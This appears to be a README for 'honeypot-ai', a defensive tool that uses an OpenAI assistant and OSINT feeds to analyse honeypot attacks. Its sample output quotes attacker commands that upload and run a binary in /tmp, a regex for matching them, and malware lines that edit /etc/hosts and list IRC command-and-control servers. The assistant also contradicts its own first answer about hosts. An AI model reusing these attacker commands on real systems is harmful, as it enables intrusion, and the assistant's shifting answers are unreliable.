Answer: Based on the data obtained from MalwareBazaar, ThreatFox, URLhaus, and Malpedia, here is what is known about the malware and potential exploits involved in the attack:

### Malware Hash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
- **First Seen:** July 16, 2022, on MalwareBazaar.
- **File Name:** Not specifically named, hash used as reference.
- **File Size:** 4766 bytes.
- **File Type MIME:** application/octet-stream.
- **File Type:** Potentially a shell script (.sh).
- **Delivery Method:** Other (not specified).
- **ClamAV Signature:** Detected as SecuriteInfo.com.PUA.Linux.AutorizedKeys-1.UNOFFICIAL.
- **Times Downloaded from MalwareBazaar:** 83 times.
- **Times Uploaded to MalwareBazaar:** 1 time.
- **ReversingLabs:** Identified as a suspicious Linux trojan with the name "Linux.Trojan.Generic".
  - First seen by ReversingLabs: May 12, 2021.
  - Matched by 27 out of 42 scanners (64.29% detection rate).
- **Spamhaus HBL:** Detected as suspicious.
- **InQuest:** Verdict rendered as malicious.
- **No Data in ThreatFox and URLhaus:** The hash doesn't appear to have entries in these two databases.

### Malware Hashes: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 and b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
- No data available from MalwareBazaar, ThreatFox, or URLhaus.

### Analysis:
- **Relevant Hosts:** No specific URLs or hosts were found associated with the malware samples.
- **Known Source IPs:** The malware was downloaded by the following IPs:
  - Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c by 93.223.169.159.
  - Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 by 27.93.25.111.
  - Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by 111.216.194.148.

The attackers appear to have utilized a known Linux trojan, potentially a shell script, as part of their attack. This malware has signatures that are detected by various antivirus and security tools, indicating its malicious nature. The lack of additional information about the other two hashes suggests that they might be less known or more recently developed samples. No specific exploits were extracted from these datasets, but the indicators suggest the use of trojanized Linux utilities or scripts as part of the attacker's toolkit.

...Truncated...
Done analyzing/postprocessing 1 attacks.
Writing markdown report for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/README.md
Finished writing markdown report and for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/README.md
Writing markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/run-steps.md
Finished writing markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/run-steps.md
Exporting attack report and files for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/reports
Finished exporting attack report and files for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/reports
Honeypot AI Finished Successfully!
````

</details>


> Enter chat mode to ask custom questions about attack with ID XXXX before analyzing, writing markdown, and exporting

````bash
honeypot-ai/run.sh -lfa --only-attack XXXX -AWE --chat
````

<details>
<summary>
Output
</summary>


````
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --chat
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.CowrieParser object at 0x10afccb90>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.ZeekParser object at 0x10ba4b010>
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
(3->3) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 18: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 <- b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by malware_urls
Merged 0 attacks by out of 18 attempts (0.0000%) 
Merge Attacks Time: 0.0030s
(3->3) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
(3->1) - Merged 2 attacks with shared sig regexes
Chatting about attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c with OpenAI Assistant

Entering Chat Mode...
Ask the AI assistant custom questions about:
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): e
Enter question: What do we know about the ips and urls found in the malware?  
Enter question key or leave empty to use 'question_1' : 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{'question_1': 'What do we know about the ips and urls found in the malware? '}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): a


Asking: What do we know about the ips and urls found in the malware? 
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tmBMj3fwLVPNhob8tg0fOxpo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tmBMj3fwLVPNhob8tg0fOxpo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tmBMj3fwLVPNhob8tg0fOxpo
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tmBMj3fwLVPNhob8tg0fOxpo
Run run_tmBMj3fwLVPNhob8tg0fOxpo completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_tmBMj3fwLVPNhob8tg0fOxpo

 Done with: What do we know about the ips and urls found in the malware? 
Answer: Based on the analysis conducted earlier, here's what we know about the IPs and URLs found in the malware:

### Malware-Related IPs and URLs:
- No specific URLs were associated with the malware based on the analysed attributes.
- The malware was downloaded during sessions initiated from the following source IPs:
  - `93.223.169.159`
  - `27.93.25.111`
  - `111.216.194.148`
  
### Analysis of Malware-related IPs:
- The three source IPs have been linked to malicious activities across various OSINT sources. They were reported for suspicious behaviors such as SSH brute force attacks and potential involvement in coordinated botnet activities.
- There have been reports and listings on blocklists and threat intelligence feeds such as AbuseIPDB, Shodan, ISC, CyberGordon, and others, indicating a history of malicious conduct.
- The IPs are associated with internet service providers in Germany and Japan and exhibited patterns that suggest they are part of an attack infrastructure.

### The Absence of URLs in the Malware:
- The data obtained did not reveal any URLs embedded within the malware itself. Therefore, there are no indicators that would point towards a specific domain or web infrastructure used for command and control or further distribution of the malware.

In conclusion, while there is substantive data regarding the nature and potential origins of the attacking IP addresses, there is no information within the provided malware sample related to URLs, which might correspond to command and control servers, download sites for additional payloads, or other malicious online infrastructure.

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): e
Enter question: What about hosts found in the malware source code? 
Enter question key or leave empty to use 'question_2' : 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{'question_2': 'What about hosts found in the malware source code?'}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): a


Asking: What about hosts found in the malware source code?
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI

AI called tool: get_malware_attrs
with args: {'malware_id': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'attrs': ['hosts']}

Submitting tool output: {'hosts': {}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Z4eTFCkmcc4LPSM8Qg2j57eI
Run run_Z4eTFCkmcc4LPSM8Qg2j57eI completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_Z4eTFCkmcc4LPSM8Qg2j57eI

 Done with: What about hosts found in the malware source code?
Answer: The malware sample analyzed did not contain any embedded hosts within its source code. Therefore, there were no specific hostnames or domain names extracted from the malware that could provide additional context or leads on the network infrastructure used for command and control or further malware distribution. This lack of embedded hosts might suggest that the malware relies on other means to communicate with its operators or to spread, such as hard-coded IP addresses, external configuration files, or a decentralized approach like a peer-to-peer network.

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): e
Enter question: look at the source code to be sure
Enter question key or leave empty to use 'question_3' : 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{'question_3': 'look at the source code to be sure'}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): a


Asking: look at the source code to be sure
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_b026ZYVrywAWc1QDEqs8XhlJ
Run run_b026ZYVrywAWc1QDEqs8XhlJ completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_b026ZYVrywAWc1QDEqs8XhlJ

 Done with: look at the source code to be sure
Answer: Certainly! Let's take a closer look at the text from the malware source code to examine if there are any hosts or domain names present.

From the earlier provided snippet of the malware source code, I noticed that there were entries related to modifying the `/etc/hosts` file and several hardcoded server addresses within an IRC botnet setup. The specific line from the source code is as follows:

```bash
echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
```

- The domain `bins.deutschland-zahlung.eu` was being redirected to the localhost address (`127.0.0.1`), which is often a technique used to block the domain by preventing the system from reaching the actual host associated with it.

As for the IRC servers, the malware code includes an array of hardcoded IRC server addresses which were part of a botnet functionality:

```bash
    arr[0]="ix1.undernet.org"
    arr[1]="ix2.undernet.org"
    arr[2]="Ashburn.Va.Us.UnderNet.org"
    arr[3]="Bucharest.RO.EU.Undernet.Org"
    arr[4]="Budapest.HU.EU.UnderNet.org"
    arr[5]="Chicago.IL.US.Undernet.org"
```

These entries are used by the botnet component of the malware to connect to these servers for command and control communication. The inclusion of multiple server addresses likely serves as a redundancy mechanism to maintain connectivity to the C2 infrastructure even if one or more servers are unavailable.

Both the redirection of the domain `bins.deutschland-zahlung.eu` to the loopback address and the hardcoded Undernet IRC server hostnames are critical in understanding the behavior and potential infrastructure of the malware.

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): e
Enter question: what do OSINT sources show about the C2 servers?
Enter question key or leave empty to use 'question_4' : 

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{'question_4': 'what do OSINT sources show about the C2 servers?'}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): a


Asking: what do OSINT sources show about the C2 servers?
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m

AI called tool: query_ioc_data
with args: {'ioc_type': 'domain', 'iocs': ['bins.deutschland-zahlung.eu'], 'sources': ['threatfox', 'urlhaus']}
Getting data for bins.deutschland-zahlung.eu from threatfox
Getting data for bins.deutschland-zahlung.eu from urlhaus

Submitting tool output: {'bins.deutschland-zahlung.eu': {'threatfox': '', 'urlhaus': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'domain', 'iocs': ['ix1.undernet.org', 'ix2.undernet.org', 'Ashburn.Va.Us.UnderNet.org', 'Bucharest.RO.EU.Undernet.Org', 'Budapest.HU.EU.UnderNet.org', 'Chicago.IL.US.Undernet.org'], 'sources': ['threatfox', 'urlhaus']}
Getting data for ix1.undernet.org from threatfox
Getting data for ix1.undernet.org from urlhaus
Getting data for ix2.undernet.org from threatfox
Getting data for ix2.undernet.org from urlhaus
Getting data for Ashburn.Va.Us.UnderNet.org from threatfox
Getting data for Ashburn.Va.Us.UnderNet.org from urlhaus
Getting data for Bucharest.RO.EU.Undernet.Org from threatfox
Getting data for Bucharest.RO.EU.Undernet.Org from urlhaus
Getting data for Budapest.HU.EU.UnderNet.org from threatfox
Getting data for Budapest.HU.EU.UnderNet.org from urlhaus
Getting data for Chicago.IL.US.Undernet.org from threatfox
Getting data for Chicago.IL.US.Undernet.org from urlhaus

Submitting tool output: {'ix1.undernet.org': {'threatfox': '', 'urlhaus': ''}, 'ix2.undernet.org': {'threatfox': '', 'urlhaus': ''}, 'Ashburn.Va.Us.UnderNet.org': {'threatfox': '', 'urlhaus': ''}, 'Bucharest.RO.EU.Undernet.Org': {'threatfox': '', 'urlhaus': ''}, 'Budapest.HU.EU.UnderNet.org': {'threatfox': '', 'urlhaus': ''}, 'Chicago.IL.US.Undernet.org': {'threatfox': '', 'urlhaus': ''}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_aB5ce7XNanjB7EH4ono09N1m
Run run_aB5ce7XNanjB7EH4ono09N1m completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_aB5ce7XNanjB7EH4ono09N1m

 Done with: what do OSINT sources show about the C2 servers?
Answer: The OSINT sources queried, ThreatFox and URLhaus, did not return any data for the domain `bins.deutschland-zahlung.eu` or the IRC server hostnames:

- `ix1.undernet.org`
- `ix2.undernet.org`
- `Ashburn.Va.Us.UnderNet.org`
- `Bucharest.RO.EU.Undernet.Org`
- `Budapest.HU.EU.UnderNet.org`
- `Chicago.IL.US.Undernet.org`

This lack of information suggests that either these domains are not recognized as part of any known threat intelligence feeds in ThreatFox and URLhaus, or they have not been reported or cataloged in relation to malicious activities in these databases.

It could be that the domain `bins.deutschland-zahlung.eu` is an internal indicator within the attacker's infrastructure or part of a less widespread campaign that hasn't been broadly detected. The Undernet IRC servers are legitimate servers likely used by the malware for command and control; their legitimate nature may explain the lack of listings in threat intelligence feeds that typically focus on malicious domains.

AI Interactive Chat
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 

Current questions:
{}

Choices:
 a) Ask questions
 e) Enter a question
 u) Upload multiline question from file
 c) Clear questions
 m) Change OpenAI model. (Current model: gpt-4-1106-preview)
 p) Print attack attributes
 q) Quit and continue main

Enter choice (a, e, u, c, m, p OR q): q                              
Finished chatting about attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c with OpenAI Assistant
Writing chat markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/ai-chat/question_1-question_4run-steps.md
Finished writing chat markdown run steps for attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c to /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/ai-chat/question_1-question_4run-steps.md
Honeypot AI Finished Successfully!
````

</details>


> Enter interactive Python shell to manually modify attacks before analyzing, writing markdown, and exporting

````bash
honeypot-ai/run.sh -lfa -AWE --interact
````

<details>
<summary>
Output
</summary>


````
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --interact
Starting honeypot-ai...
Entering interactive mode (python shell)...

1 attacks are loaded into the 'ATTACKS' dict and 'ATTACKS_LIST' variables)
Attack attributes can be accessed via 'ATTACKS[ATTACK_ID].ATTR_NAME' or 'ATTACKS_LIST[ATTACK_INDEX].ATTR_NAME'Use dir(ATTACKS_LIST[0]) to see available Attack attr names and functions.
Use 'exit()' or type CTRL-D to exit interactive mode
>>> attack0 = ATTACKS_LIST[0]
>>> attack0
Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 
>>> attack0.split_commands
['scp -t /tmp/BUwTrLEj', 'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', './BUwTrLEj']
>>> attack0.sessions[0]
Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s
>>> attack0.sessions[0].start_time
datetime.datetime(2024, 1, 26, 21, 59, 42, 976396)
>>> attack0.commands.append("some modification")
>>> attack0.commands
['scp -t /tmp/BUwTrLEj', 'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', './BUwTrLEj', 'some modification']
>>> ^D
Exiting interactive mode and continuing honeypot-ai...
Honeypot AI Finished Successfully!
````

</details>


> Update config file with values from command line arguments

````bash
honeypot-ai/run.sh --config config.json --update-config --openai-api-key YOUR_API_KEY
````

<details>
<summary>
Output
</summary>


````
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh --config config.json --update-config --openai-model gpt-4-1106-preview
Starting honeypot-ai...

Updated config file at config.json
No attack loading method specified. Use (-lfl/--load-from-logs) OR (-lfa/--load-from-attacks-dir)
````

</details>



</details>

---


<details>
<summary>
<h2>Advanced Usage</h2>
</summary>


### All Command Line Arguments

````bash
usage: main.py [-h] [--list-attacks] [--print-attrs ATTACK_ATTRS [ATTACK_ATTRS ...]] [--organize-attacks] [--analyze-attacks] [--chat] [--write-reports] [--export-reports] [--interactive] [--config FILE] [--update-config]
               [--load-from-logs] [--load-from-attacks-dir] [--only-attacks ATTACK_IDS [ATTACK_IDS ...]] [--skip-attacks ATTACK_IDS [ATTACK_IDS ...]] [--max-ips-per-attack MAX_IPS_PER_ATTACK] [--max-attacks MAX_ATTACKS]
               [--sort-attrs SORT_ATTRS [SORT_ATTRS ...]] [--sort-order SORT_ORDER] [--load-attacks-max-workers LOAD_ATTACKS_MAX_WORKERS] [--log-types LOG_TYPES [LOG_TYPES ...]]
               [--zeek-log-types ZEEK_LOG_TYPES [ZEEK_LOG_TYPES ...]] [--zeek-log-ext ZEEK_LOG_EXT] [--zeek-keep-empty-fields | --no-zeek-keep-empty-fields] [--zeek-keep-unset-fields | --no-zeek-keep-unset-fields]
               [--attack-min-commands ATTACK_MIN_COMMANDS] [--attack-min-malware ATTACK_MIN_MALWARE] [--attack-min-successful-logins ATTACK_MIN_SUCCESSFUL_LOGINS] [--attack-min-http-requests ATTACK_MIN_HTTP_REQUESTS]
               [--attack-http-uri-regexes ATTACK_HTTP_URI_REGEXES [ATTACK_HTTP_URI_REGEXES ...]] [--attack-http-anywhere-regexes ATTACK_HTTP_ANYWHERE_REGEXES [ATTACK_HTTP_ANYWHERE_REGEXES ...]]
               [--standardize-regex-commands STANDARDIZE_REGEX_COMMANDS [STANDARDIZE_REGEX_COMMANDS ...]] [--standardize-regex-malware STANDARDIZE_REGEX_MALWARE [STANDARDIZE_REGEX_MALWARE ...]]
               [--standardize-regex-http-requests STANDARDIZE_REGEX_HTTP_REQUESTS [STANDARDIZE_REGEX_HTTP_REQUESTS ...]] [--merge-shared-attrs MERGE_SHARED_ATTRS [MERGE_SHARED_ATTRS ...]]
               [--merge-regex-commands MERGE_REGEX_COMMANDS [MERGE_REGEX_COMMANDS ...]] [--merge-regex-malware MERGE_REGEX_MALWARE [MERGE_REGEX_MALWARE ...]]
               [--merge-regex-http-requests MERGE_REGEX_HTTP_REQUESTS [MERGE_REGEX_HTTP_REQUESTS ...]] [--organizer-overwrite | --no-organizer-overwrite | --overwrite | --no-overwrite]
               [--organizer-iterby ORGANIZER_ITERBY] [--organizer-concurrency-type ORGANIZER_CONCURRENCY_TYPE] [--organizer-max-workers ORGANIZER_MAX_WORKERS] [--organizer-chunksize ORGANIZER_CHUNKSIZE]
               [--organizer-yield-order ORGANIZER_YIELD_ORDER] [--organizer-ip-subdirs | --no-organizer-ip-subdirs | --ip-subdirs | --no-ip-subdirs] [--use-openai | --no-use-openai | --openai | --no-openai]
               [--use-openai-code-interpreter | --no-use-openai-code-interpreter | --openai-code-interpreter | --no-openai-code-interpreter] [--openai-api-key OPENAI_API_KEY] [--openai-model OPENAI_MODEL]
               [--openai-training-data-path OPENAI_TRAINING_DATA_PATH] [--use-ipanalyzer | --no-use-ipanalyzer | --ipanalyzer | --no-ipanalyzer] [--ipanalyzer-sources IPANALYZER_SOURCES [IPANALYZER_SOURCES ...]]
               [--ipanalyzer-max-errors IPANALYZER_MAX_ERRORS] [--webdriver-path WEBDRIVER_PATH] [--webdriver-type WEBDRIVER_TYPE]
               [--use-malwareanalyzer | --no-use-malwareanalyzer | --malwareanalyzer | --no-malwareanalyzer] [--malwareanalyzer-sources MALWAREANALYZER_SOURCES [MALWAREANALYZER_SOURCES ...]]
               [--malwareanalyzer-max-errors MALWAREANALYZER_MAX_ERRORS] [--malwareanalyzer-allow-downloads | --no-malwareanalyzer-allow-downloads] [--user-ips USER_IPS [USER_IPS ...]]
               [--honeypot-external-ips HONEYPOT_EXTERNAL_IPS [HONEYPOT_EXTERNAL_IPS ...]] [--honeypot-internal-ips HONEYPOT_INTERNAL_IPS [HONEYPOT_INTERNAL_IPS ...]] [--honeypot-ports HONEYPOT_PORTS [HONEYPOT_PORTS ...]]
               [--honeypot-software HONEYPOT_SOFTWARE [HONEYPOT_SOFTWARE ...]] [--logs-path LOGS_PATH] [--cowrie-logs-path COWRIE_LOGS_PATH] [--firewall-logs-path FIREWALL_LOGS_PATH] [--web-logs-path WEB_LOGS_PATH]
               [--zeek-logs-path ZEEK_LOGS_PATH] [--malware-downloads-path MALWARE_DOWNLOADS_PATH] [--auth-random-path AUTH_RANDOM_PATH] [--resources-path RESOURCES_PATH] [--attacks-path ATTACKS_PATH] [--db-path DB_PATH]
               [--ipdb-path IPDB_PATH] [--mwdb-path MWDB_PATH] [--aidb-path AIDB_PATH] [--reports-path REPORTS_PATH]

honeypot-ai: Honeypot Log Analyzer Built on OpenAI

options:
  -h, --help            show this help message and exit

Actions:
  Actions to perform on loaded attacks

  --list-attacks, --list, -L
                        List loaded attacks
  --print-attrs ATTACK_ATTRS [ATTACK_ATTRS ...], --print ATTACK_ATTRS [ATTACK_ATTRS ...], -P ATTACK_ATTRS [ATTACK_ATTRS ...]
                        Print specified attributes of loaded attacks
  --organize-attacks, --organize, -O
                        Organize attacks into attack directories
  --analyze-attacks, --analyze, -A
                        Analyze loaded attacks with OpenAI and OSINT Analyzers
  --chat, -C            Chat with the OpenAI Assistant about the loaded attacks
  --write-reports, --write, -W
                        Write markdown reports for analyzed attacks
  --export-reports, --export, -E
                        Export attack report and files to REPORTS_PATH
  --interactive, --interact, -I
                        Enter interactive mode after loading attacks (python shell with loaded attacks in the "ATTACKS" variable)

Config File:
  Config file to load settings from

  --config FILE, -c FILE
                        Path to config file
  --update-config, -u   Update config file with new values

Loading Attacks:
  Methods for loading attacks from logs or the attacks directory

  --load-from-logs, -lfl, -ll
                        Load attacks from logs
  --load-from-attacks-dir, -lfa, -la
                        Load attacks from attacks directory
